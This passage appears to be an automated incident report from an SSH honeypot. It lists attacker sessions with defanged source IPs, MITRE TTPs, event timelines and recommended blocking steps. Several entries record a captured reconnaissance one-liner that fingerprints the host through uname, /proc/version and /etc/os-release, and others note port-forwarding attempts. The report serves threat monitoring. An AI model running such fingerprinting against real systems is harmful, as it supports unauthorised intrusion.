| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.success` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.log.closed` |
| `2026-07-10 11:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223efc4e6ae4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:46 |
| **Last Seen** | 2026-07-10 11:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:46:21` | `cowrie.session.connect` |
| `2026-07-10 11:46:21` | `cowrie.client.version` |
| `2026-07-10 11:46:21` | `cowrie.client.kex` |
| `2026-07-10 11:46:22` | `cowrie.login.success` |
| `2026-07-10 11:46:23` | `cowrie.session.params` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.success` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:23` | `cowrie.command.input` |
| `2026-07-10 11:46:24` | `cowrie.log.closed` |
| `2026-07-10 11:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7cbbfb61d15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:47 |
| **Last Seen** | 2026-07-10 11:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:47:42` | `cowrie.session.connect` |
| `2026-07-10 11:47:42` | `cowrie.client.version` |
| `2026-07-10 11:47:42` | `cowrie.client.kex` |
| `2026-07-10 11:47:43` | `cowrie.login.success` |
| `2026-07-10 11:47:44` | `cowrie.session.params` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.success` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.command.input` |
| `2026-07-10 11:47:44` | `cowrie.log.closed` |
| `2026-07-10 11:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b598e439729

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:49 |
| **Last Seen** | 2026-07-10 11:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:49:00` | `cowrie.session.connect` |
| `2026-07-10 11:49:01` | `cowrie.client.version` |
| `2026-07-10 11:49:01` | `cowrie.client.kex` |
| `2026-07-10 11:49:01` | `cowrie.login.success` |
| `2026-07-10 11:49:03` | `cowrie.session.params` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.success` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.command.input` |
| `2026-07-10 11:49:03` | `cowrie.log.closed` |
| `2026-07-10 11:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94981041029

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:50 |
| **Last Seen** | 2026-07-10 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:50:19` | `cowrie.session.connect` |
| `2026-07-10 11:50:19` | `cowrie.client.version` |
| `2026-07-10 11:50:19` | `cowrie.client.kex` |
| `2026-07-10 11:50:19` | `cowrie.login.success` |
| `2026-07-10 11:50:20` | `cowrie.session.params` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.success` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.command.input` |
| `2026-07-10 11:50:20` | `cowrie.log.closed` |
| `2026-07-10 11:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-627a38b4b0ab

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-10 11:50 |
| **Last Seen** | 2026-07-10 11:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:50:58` | `cowrie.session.connect` |
| `2026-07-10 11:50:58` | `cowrie.client.version` |
| `2026-07-10 11:50:58` | `cowrie.client.kex` |
| `2026-07-10 11:51:00` | `cowrie.login.success` |
| `2026-07-10 11:51:01` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5628ce7fed5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:51 |
| **Last Seen** | 2026-07-10 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:51:37` | `cowrie.session.connect` |
| `2026-07-10 11:51:37` | `cowrie.client.version` |
| `2026-07-10 11:51:37` | `cowrie.client.kex` |
| `2026-07-10 11:51:38` | `cowrie.login.success` |
| `2026-07-10 11:51:39` | `cowrie.session.params` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.success` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.command.input` |
| `2026-07-10 11:51:39` | `cowrie.log.closed` |
| `2026-07-10 11:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e0a4a097b4e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 11:52 |
| **Last Seen** | 2026-07-10 11:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:52:29` | `cowrie.session.connect` |
| `2026-07-10 11:52:30` | `cowrie.client.version` |
| `2026-07-10 11:52:30` | `cowrie.client.kex` |
| `2026-07-10 11:52:35` | `cowrie.login.success` |
| `2026-07-10 11:52:40` | `cowrie.session.params` |
| `2026-07-10 11:52:40` | `cowrie.command.input` |
| `2026-07-10 11:52:41` | `cowrie.log.closed` |
| `2026-07-10 11:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0900630d0184

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:52 |
| **Last Seen** | 2026-07-10 11:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:52:56` | `cowrie.session.connect` |
| `2026-07-10 11:52:56` | `cowrie.client.version` |
| `2026-07-10 11:52:56` | `cowrie.client.kex` |
| `2026-07-10 11:52:57` | `cowrie.login.success` |
| `2026-07-10 11:52:58` | `cowrie.session.params` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.success` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.command.input` |
| `2026-07-10 11:52:58` | `cowrie.log.closed` |
| `2026-07-10 11:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efd2d37dc5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:54 |
| **Last Seen** | 2026-07-10 11:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:54:15` | `cowrie.session.connect` |
| `2026-07-10 11:54:15` | `cowrie.client.version` |
| `2026-07-10 11:54:15` | `cowrie.client.kex` |
| `2026-07-10 11:54:15` | `cowrie.login.success` |
| `2026-07-10 11:54:16` | `cowrie.session.params` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.success` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.command.input` |
| `2026-07-10 11:54:16` | `cowrie.log.closed` |
| `2026-07-10 11:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57a07b77175

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-07-10 11:54 |
| **Last Seen** | 2026-07-10 11:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:54:31` | `cowrie.session.connect` |
| `2026-07-10 11:54:32` | `cowrie.client.version` |
| `2026-07-10 11:54:32` | `cowrie.client.kex` |
| `2026-07-10 11:54:34` | `cowrie.login.success` |
| `2026-07-10 11:54:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894356799371

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-10 11:54 |
| **Last Seen** | 2026-07-10 11:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:54:44` | `cowrie.session.connect` |
| `2026-07-10 11:54:45` | `cowrie.client.version` |
| `2026-07-10 11:54:45` | `cowrie.client.kex` |
| `2026-07-10 11:54:47` | `cowrie.login.success` |
| `2026-07-10 11:54:47` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc1342bbc75

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:55 |
| **Last Seen** | 2026-07-10 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:55:34` | `cowrie.session.connect` |
| `2026-07-10 11:55:34` | `cowrie.client.version` |
| `2026-07-10 11:55:34` | `cowrie.client.kex` |
| `2026-07-10 11:55:34` | `cowrie.login.success` |
| `2026-07-10 11:55:35` | `cowrie.session.params` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.success` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.command.input` |
| `2026-07-10 11:55:35` | `cowrie.log.closed` |
| `2026-07-10 11:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdbafb7c8fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:56 |
| **Last Seen** | 2026-07-10 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:56:56` | `cowrie.session.connect` |
| `2026-07-10 11:56:56` | `cowrie.client.version` |
| `2026-07-10 11:56:56` | `cowrie.client.kex` |
| `2026-07-10 11:56:56` | `cowrie.login.success` |
| `2026-07-10 11:56:57` | `cowrie.session.params` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.success` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:57` | `cowrie.command.input` |
| `2026-07-10 11:56:58` | `cowrie.log.closed` |
| `2026-07-10 11:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0014ac1893b6

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-07-10 11:57 |
| **Last Seen** | 2026-07-10 11:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:57:22` | `cowrie.session.connect` |
| `2026-07-10 11:57:23` | `cowrie.client.version` |
| `2026-07-10 11:57:23` | `cowrie.client.kex` |
| `2026-07-10 11:57:26` | `cowrie.login.success` |
| `2026-07-10 11:57:27` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-558885fbfa37

| Field | Detail |
|---|---|
| **Source IP** | `169.211.232[.]182` |
| **First Seen** | 2026-07-10 11:57 |
| **Last Seen** | 2026-07-10 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:57:33` | `cowrie.session.connect` |
| `2026-07-10 11:57:34` | `cowrie.client.version` |
| `2026-07-10 11:57:34` | `cowrie.client.kex` |
| `2026-07-10 11:57:36` | `cowrie.login.success` |
| `2026-07-10 11:57:37` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.232[.]182` to AbuseIPDB if not already reported
- [ ] Block `169.211.232[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
